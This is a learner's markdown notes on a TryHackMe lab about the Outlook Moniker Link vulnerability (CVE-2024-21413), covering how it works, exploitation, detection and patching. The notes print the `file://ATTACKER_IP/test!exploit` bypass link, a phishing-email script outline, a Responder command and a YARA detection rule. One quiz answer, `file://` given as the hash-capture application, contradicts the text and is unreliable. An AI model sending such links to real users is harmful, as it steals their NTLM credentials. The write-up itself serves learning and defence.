| [Home](../README.md) | [Cyber Security 101](../README.md#cyber-security-101) | **Moniker Link (CVE-2024-21413)** |

## Contents
- [Introduction](#introduction)
- [Moniker Link (CVE-2024-21413)](#moniker-link-cve-2024-21413)
- [Exploitation](#exploitation)
- [Detection](#detection)
- [Remediation](#remediation)
- [Conclusion](#conclusion)


## üìòIntroduction
### Vulnerability Overview
#### Disclosure & Attribution
- On February 13th, 2024, Microsoft disclosed a critical vulnerability affecting Outlook, designated **CVE-2024-21413**, also known as **Moniker Link**.
- Discovered by **Haifei Li** from **Check Point Research**.

#### Technical Summary
- The issue stems from Outlook mishandling **Moniker Links**, a specific type of hyperlink.
- Outlook's security controls can be **bypassed** when a user **clicks** a malicious Moniker Link in an email.
- Once clicked, the vulnerability allows the attacker to:
	- Trigger **Remote Code Execution (RCE)**
	- **Harvest NTLM credentials** by tricking Outlook into authenticating to a remote resource.

#### CVSS Scoring & Details
- **Impact:** Remote Code Execution & Credential Leak
- **Severity:** Critical
- **Attack Complexity:** Low
- **CVSS Score:** 9.8
- **Official Advisory:** [Microsoft MSRC](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2024-21413)

#### üß™ Affected Versions
- Microsoft Office LTSC 2021 ‚Äì from version 19.0.0
- Microsoft 365 Apps for Enterprise ‚Äì from version 16.0.1
- Microsoft Office 2019 ‚Äì from version 16.0.1
- Microsoft Office 2016 ‚Äì from version 16.0.0 up to (but not including) 16.0.5435.1001

### Learning Objectives
#### Key Areas of Study
- Understand the internal mechanics of the **Moniker Link vulnerability**
- Explore the role of Outlook‚Äôs **Protected View** and its limitations
- Practice **credential theft via NTLM relay** from an Outlook client
- Learn how to **detect and mitigate** the vulnerability in enterprise environments


### ‚ùì Question - What "Severity" rating has the CVE been assigned?
#### üß™ Process
 - Critical

Trying this as the answer
#### ‚úÖ Answer
- `Critical` ‚úÖ


## üìòMoniker Link (CVE-2024-21413)
### How the Vulnerability Works
#### Outlook Email Rendering & Link Handling
- Outlook can display **HTML-formatted emails**, commonly used in newsletters and marketing content.
- It parses standard hyperlinks like `http://` and `https://`, but also supports **Moniker Links**, which reference **Windows applications** or resources.

#### Protected View & Default Behavior
- When a Moniker Link tries to launch an external application, Outlook prompts a security warning.
- This is due to **Protected View**, a security feature designed to:
	- Open potentially risky content in **read-only mode**
	- **Block active content**, including macros and external protocol handlers

#### Moniker Link Exploitation
- Attackers can craft malicious links using the `file://` protocol:
	```html
	<a href="file://ATTACKER_IP/test">Click me</a>
	```
- This causes Outlook to attempt to access a file via **SMB**, using the victim's **NTLM credentials**.
- However, **Protected View blocks this behavior** under normal conditions.

#### Protected View Bypass
- The core vulnerability lies in a **bypass technique** using the `!` character in the Moniker Link:
	```html
	<a href="file://ATTACKER_IP/test!exploit">Click me</a>
	```
- This modified link:
	- Circumvents Protected View
	- Still triggers **SMB authentication** even if the share or file does not exist
	- Results in **NTLMv2 hashes** being leaked to the attacker's system

#### RCE Potential
- **Remote Code Execution** is technically possible because Moniker Links leverage the **Windows COM (Component Object Model)**.
- However, this room does **not demonstrate RCE**, and **no public proof-of-concept exists** for achieving RCE via this CVE at the time of writing.

### ‚ùì Question 1 - What Moniker Link type do we use in the hyperlink? 
#### üß™ Process
- `file://`

Trying this as the answer
#### ‚úÖ Answer 1
- `file://` ‚úÖ

### ‚ùì Question 2 - What is the special character used to bypass Outlook's "Protected View"?
#### üß™ Process
- `!`

Trying this as the answer
#### ‚úÖ Answer 2
- `!` ‚úÖ


## üìòExploitation
### Exploitation Walkthrough: Sending the Malicious Email
#### Objective of the Attack
- The goal is to send an **email containing a Moniker Link** that **bypasses Protected View** in Outlook.
- When clicked, Outlook will attempt to fetch a file from the attacker's machine, leaking the victim's **netNTLMv2 hash** via SMB authentication.
### Proof of Concept (PoC) Overview
#### Author & Metadata
- **Author:** CMNatic
- **GitHub:** [https://github.com/cmnatic](https://github.com/cmnatic)
- **Version:** 1.0
- **Date:** 19/02/2024

#### Python Email Script Summary
- Sends an HTML-formatted email with a crafted Moniker Link to the victim
- Requires:
	- **Sender email:** `attacker@monikerlink.thm`  
	- **Receiver email:** `victim@monikerlink.thm`  
	- **SMTP server:** `10.10.167.93`  
	- **Email password:** `"attacker"` (for demo purposes)
- Key HTML payload in the message:
	```html
	<a href="file://ATTACKER_MACHINE/test!exploit">Click me</a>
	```
- The script performs:
	- Authentication to the mail server
	- Constructs and sends the email using `smtplib`
	- Uses `MIMEMultipart` and `MIMEText` to format HTML content

### Attack Setup and Execution
#### On the AttackBox
- Edit the PoC script:
	- Update the `file://` link with your **AttackBox IP**
	- Replace `MAILSERVER` with `10.10.167.93`
- Save it as `exploit.py` using `nano` or another editor
- Run the script using:
	```bash
	python3 exploit.py
	```
- Expected output: `Email delivered`
- Troubleshooting: If authentication fails, verify credentials and server values

### SMB Listener with Responder
#### Start Responder to Capture NTLM Hashes
- On the AttackBox, run:
	```bash
	responder -I ens5
	```
- Replace `ens5` with your interface name if using a different environment
- Responder will listen for incoming SMB/LLMNR/NBT-NS traffic

### Victim Environment Interaction
#### Outlook Setup
- Open Outlook on the vulnerable VM via the desktop shortcut
- Dismiss initial setup and license key pop-ups
- Preconfigured victim mailbox will appear

#### Interacting with the Payload
- Wait for the malicious email to arrive
- Click the **"Click me"** link in the email
- This triggers the SMB request to the attacker's IP

### Result: Credential Capture
#### After Email Click
- Outlook attempts to load the file
- SMB authentication is triggered
- **Responder captures the netNTLMv2 hash** from the victim's system

### ‚ùì Question 1 - What is the name of the application that we use on the AttackBox to capture the user's hash?
#### üß™ Process
 - Revisit - I did the task but got wraped up in it and forgot to document. Will revisit later today
 
Trying this as the answer
#### ‚úÖ Answer 1
- `file://`

### ‚ùì Question 2 - What type of hash is captured once the hyperlink in the email has been clicked?
#### üß™ Process
 - Revisit - I did the task but got wraped up in it and forgot to document. Will revisit later today
 
#### ‚úÖ Answer 2
 - `netNTLMv2`


## üìòDetection
### Detection & Analysis Techniques
#### YARA Rule Detection
- A YARA rule was created by Florian Roth and X__Junior to detect Moniker Link exploitation attempts in email content related to CVE-2024-21413.
- The rule looks for indicators such as:
	- Email headers like `"Subject: "` and `"Received: "`
	- Suspicious **file paths using `file:///\\` format**, followed by file extensions and a `!` character (indicative of the Protected View bypass)
- Matching logic:
		- File size must be **under 1000KB**
		- All header-related patterns must be present (`$a*`)
		- At least one Moniker-style file path pattern must match (`$xr*`)
- Sample rule:
	```yara
	rule EXPL_CVE_2024_21413_Microsoft_Outlook_RCE_Feb24 {
	   meta:
	      description = "Detects emails that contain signs of a method to exploit CVE-2024-21413 in Microsoft Outlook"
	      author = "X__Junior, Florian Roth"
	      reference = "https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability/"
	      date = "2024-02-17"
	      modified = "2024-02-19"
	      score = 75
	   strings:
	      $a1 = "Subject: "
	      $a2 = "Received: "
	      $xr1 = /file:\/\/\/\\\\[^"']{6,600}\.(docx|txt|pdf|...|vbs|wsf|xls|xlsm|...|dotm)!/
	   condition:
	      filesize < 1000KB
	      and all of ($a*)
	      and 1 of ($xr*)
	}
	```

### Network Forensics with Wireshark
#### SMB Request Capture
- When the **malicious Moniker Link** is clicked, Outlook sends a **SMB authentication request** to the attacker‚Äôs machine.
- This request can be observed in **Wireshark** and typically contains:
	- A connection attempt over SMB
	- A **truncated netNTLMv2 hash** in the packet capture
- This technique can be used by defenders to:
	- Verify attempted exploitation
	- Correlate email payloads with network traffic
	- Extract hash data for forensic analysis


## üìòRemediation
### Mitigation & Best Practices
#### Microsoft Patch Release
- Microsoft released a fix for **CVE-2024-21413** as part of **February 2024 Patch Tuesday**
- The update is available via:
	- **Windows Update**
	- **Microsoft Update Catalog**
	- A full list of **KB articles by Office build** can be referenced on Microsoft's official advisory pages.
#### Security Awareness & User Training
- While the patch addresses the core issue, users should be reminded to follow standard **cyber hygiene practices**:
	- **Do not click** on links from **unsolicited emails**
	- **Preview links** before clicking to ensure they point to legitimate destinations
	- **Forward suspicious emails** to the internal **cybersecurity or IT department**

#### Outlook Configuration & SMB Considerations
- Because this vulnerability **bypasses Outlook's Protected View**, there is **no configuration-based workaround** to fully prevent it.
- **Disabling SMB** system-wide is not advisable due to its critical role in accessing **network shares**.
- However, **firewall-level restrictions** may be used to:
	- Block **outbound SMB connections** to untrusted or external IP addresses
	- Reduce exposure to **unauthorized NTLM credential leaks**


## üìòConclusion
### Conclusion
#### Final Thoughts
- **CVE-2024-21413** poses a significant risk due to its:
	- **Widespread impact** across various Microsoft Office versions
	- **Low attack complexity**, making exploitation relatively easy
- Given the popularity of **Outlook as an email client**, the vulnerability has the potential for **broad abuse** if left unpatched.

#### Patch Reminder
- As a critical reminder:
	- **Update Outlook immediately** via **Windows Update** or the **Microsoft Update Catalog**
	- There is **no user-side configuration** to prevent this attack due to the **Protected View bypass**

#### Wrap-Up
- That concludes the TryHackMe room on **Moniker Link (CVE-2024-21413)**
- The hands-on walkthrough provided insight into:
	- How the vulnerability works
	- How to exploit and detect it
	- How to mitigate and respond